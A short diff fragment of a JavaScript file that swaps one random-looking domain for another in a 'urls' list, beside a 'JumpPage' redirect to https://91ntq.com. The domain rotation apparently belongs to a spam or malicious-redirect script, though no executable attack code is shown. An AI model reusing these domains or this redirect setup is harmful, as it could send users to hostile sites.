@@ -39,7 +39,7 @@ var emails = [
 var urls=[
 	'ikqitomjd.cc/', 
 	'pkhhrpoed.cc/', 
-    'jsbynoggy.com/',
+    'rwtmkmirr.cc/',
 ];                                                                                                                  
 
 var JumpPage="https://91ntq.com";
